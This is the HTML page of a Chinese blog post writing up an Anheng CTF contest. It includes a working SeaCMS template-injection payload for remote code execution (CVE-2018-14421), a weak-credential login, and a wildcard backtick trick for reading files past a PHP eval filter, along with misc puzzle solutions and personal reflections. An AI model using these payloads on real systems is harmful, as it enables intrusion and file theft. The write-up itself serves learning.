@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP,WEB,安恒,MISC,人生杂谈," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WEB1一道cms题目 先弱口令进后台 1admin admin123 后台看到这个东西，下载可以看到源码  当时看到代码审计就放弃了 其实当初看到是CMS的时候就应该多搜下CMS的 重点在与parseif函数 具体参考 1https://www.anquanke.com/post/id/153402 这是mlt师傅的CVE-2018-14421 博客地址 payload 添加图片处 12lego">
+<meta name="keywords" content="PHP,WEB,安恒,MISC,人生杂谈">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒9月月赛小记">
+<meta property="og:url" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/index.html">
+<meta property="og:site_name" content="Mugen">
+<meta property="og:description" content="WEB1一道cms题目 先弱口令进后台 1admin admin123 后台看到这个东西，下载可以看到源码  当时看到代码审计就放弃了 其实当初看到是CMS的时候就应该多搜下CMS的 重点在与parseif函数 具体参考 1https://www.anquanke.com/post/id/153402 这是mlt师傅的CVE-2018-14421 博客地址 payload 添加图片处 12lego">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/2.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/8.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/10.jpg">
+<meta property="og:updated_time" content="2018-09-27T16:47:09.739Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒9月月赛小记">
+<meta name="twitter:description" content="WEB1一道cms题目 先弱口令进后台 1admin admin123 后台看到这个东西，下载可以看到源码  当时看到代码审计就放弃了 其实当初看到是CMS的时候就应该多搜下CMS的 重点在与parseif函数 具体参考 1https://www.anquanke.com/post/id/153402 这是mlt师傅的CVE-2018-14421 博客地址 payload 添加图片处 12lego">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/27/安恒9月月赛小记/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/27/安恒9月月赛小记/"/>
+
+
+
+
+
+  <title>安恒9月月赛小记 | Mugen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mugen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">lego's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/27/安恒9月月赛小记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lego">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mugen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安恒9月月赛小记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-27T21:40:16+08:00">
+                2018-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>一道cms题目</p>
+<p>先弱口令进后台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin admin123</span><br></pre></td></tr></table></figure>
+<p>后台看到这个东西，下载可以看到源码</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/1.jpg" alt=""></p>
+<p>当时看到代码审计就放弃了</p>
+<p>其实当初看到是CMS的时候就应该多搜下CMS的</p>
+<p>重点在与<code>parseif</code>函数 具体参考</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/153402</span><br></pre></td></tr></table></figure>
+<p>这是mlt师傅的CVE-2018-14421 <a href="http://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html" target="_blank" rel="noopener">博客地址</a></p>
+<p>payload</p>
+<p>添加图片处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lego</span><br><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][lego]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][test]);die();//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+<p>然后访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10000/web/index.php?r=content/show&amp;id=471&amp;lego=system&amp;test=ls</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/27/安恒9月月赛小记/2.jpg" alt=""></p>
+<p>前面说了flag in /tmp/flag</p>
+<p>所以直接读flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h3><p>题目是代码审计的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>但是看到什么都被过滤了还是很难受，看到另一个大佬的博客但是没看懂，和这个类似但不同</p>
+<p>这里需要了解一个概念就是Linux下的通配符问题</p>
+<p>例如执行cat可以这样执行</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/3.png" alt=""></p>
+<p>就是说可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??? =&gt; /bin/cat</span><br></pre></td></tr></table></figure>
+<p>参考<a href="http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2" target="_blank" rel="noopener">一叶飘零</a>师傅的博客</p>
+<p>可以构造一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</span><br></pre></td></tr></table></figure>
+<p>&lt;? ?&gt;是php中的一个短标签</p>
+<p>直接读我火狐很卡而且读出来的数据好像不完整</p>
+<p>我们可以先curl下数据来再用其他软件打开，我是用010editor</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://101.71.29.5:10001/?code=?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</span><br></pre></td></tr></table></figure>
+<p>打开看到flag在/flag目录下</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/4.jpg" alt=""></p>
+<p>所有我们可以直接读/flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/????`;?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa5237a5fc25af3fa07f1d724f7548d7&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>CRC32爆破</p>
+<p>简单理解就是因为这个压缩包才4k</p>
+<p>我们可以通过crc32来枚举数据内容</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/5.jpg" alt=""></p>
+<p>依次解1.txt 2.txt 3.txt</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/6.jpg" alt=""><img src="/2018/09/27/安恒9月月赛小记/7.jpg" alt=""></p>
+<p>所以解压密码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forum_91ctf_com_66</span><br></pre></td></tr></table></figure>
+<p>然后convert.txt是一堆01组成的二进制数字</p>
+<p>写个简单的脚本把他转换成字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'convert.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">s=<span class="string">""</span></span><br><span class="line">s=f.read()</span><br><span class="line">b=re.findall(<span class="string">r'.&#123;8&#125;'</span>, s)</span><br><span class="line"></span><br><span class="line">g=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">	a=(int(i,<span class="number">2</span>))</span><br><span class="line">	g=g+chr(a)</span><br><span class="line"><span class="keyword">print</span> g</span><br></pre></td></tr></table></figure>
+<p>得到一个html里面图片标签，保存成html文件打开</p>
+<p>得到一个二维码扫描得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;owid0-o91hf-9iahg&#125;</span><br></pre></td></tr></table></figure>
+<p>这次安恒我就只做出这题来了….QAQ</p>
+<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>这道题当时没怎么看</p>
+<p>只知道图片里面有个压缩包里面是个流量包，但是要密码。</p>
+<p>原来这个</p>
+<p>开始要改图片高度（以后要多试试这个）</p>
+<p>也就是改这里</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/8.jpg" alt=""></p>
+<p>然后我们可以看到密码</p>
+<p><img src="/2018/09/27/安恒9月月赛小记/9.png" alt=""></p>
+<p>解压，流量包http导出</p>
+<p>看到有神奇字符串<img src="/2018/09/27/安恒9月月赛小记/10.jpg" alt=""></p>
+<p>解base64得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Oz_4nd_Hir0_lov3_For3ver&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>聊聊最近</p>
+<p>那群黑阔原来还能嫌弃别人黑阔了，</p>
+<p>对不起你们不是我们前辈，我不认为。</p>
+<p>一群自己干不干净心里没有一点B数的人，还能说别人黑了。</p>
+<p><strong>虽然各个冠冕堂皇站在干岸上，你们，就那么干净吗？</strong> </p>
+<p>真的是出事万人踩。</p>
+<p>我也自我反省一下，</p>
+<p>确实一开始没想太多，下意识的做了看客般的行为。</p>
+<p>后来才意识到，这件事意味着什么？</p>
+<p>祝一切安好！</p>
+<p>从这次事情中也看见了很多冷暖，</p>
+<p>我的信条又是什么？</p>
+<p>正义在我眼里是什么？</p>
+<p>我是否是一名“白帽子”？</p>
+<p>我没有那么干干净净，我也知道很多人也没有那么干干净净。</p>
+<p>hc我没碰过，</p>
+<p>但是实践这一点上，法律是不允许的。</p>
+<p>没有授权就是黑。</p>
+<p>那就让黑阔们去给你们测吧。</p>
+<p>乌云凉了之后，</p>
+<p>虽然各大平台也建立自己的SRC，但环境大大不一样了。</p>
+<p>我最早接触安全的时候也不是从什么正途接触的，虽然红盟带点色彩，</p>
+<p>但是实质和一般黑客论坛区别不算大。</p>
+<p>所以未来的路，我需要很多努力来让我变正，</p>
+<p>喜欢吹水的我也要控制一下自己，</p>
+<p>毕竟安全行业是个要耐得住性子的行业。</p>
+<p>大佬很强，我很菜。</p>
+<p>但是不要因遥远而停止了前进的步伐。</p>
+<blockquote>
+<p>陌生人，我也为你们祝福 　　</p>
+<p>愿你有一个一个灿烂的前程 　　</p>
+<p>愿你有情人终成眷属 　　</p>
+<p>愿你在尘世间获得幸福 　　</p>
+<p>我只愿面朝大海，春暖花开 　　</p>
+<p>我只愿面朝大海，春暖花开 </p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+            <a href="/tags/安恒/" rel="tag"># 安恒</a>
+          
+            <a href="/tags/MISC/" rel="tag"># MISC</a>
+          
+            <a href="/tags/人生杂谈/" rel="tag"># 人生杂谈</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/20/Linux提权思路/" rel="next" title="Linux提权思路+实战">
+                <i class="fa fa-chevron-left"></i> Linux提权思路+实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png"
+                alt="lego" />
+            
+              <p class="site-author-name" itemprop="name">lego</p>
+              <p class="site-description motion-element" itemprop="description">从小菜鸡往大菜鸡成长的路上...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB1"><span class="nav-number">1.</span> <span class="nav-text">WEB1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB2"><span class="nav-number">1.1.</span> <span class="nav-text">WEB2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc1"><span class="nav-number">1.2.</span> <span class="nav-text">misc1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc2"><span class="nav-number">1.3.</span> <span class="nav-text">misc2</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lego</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
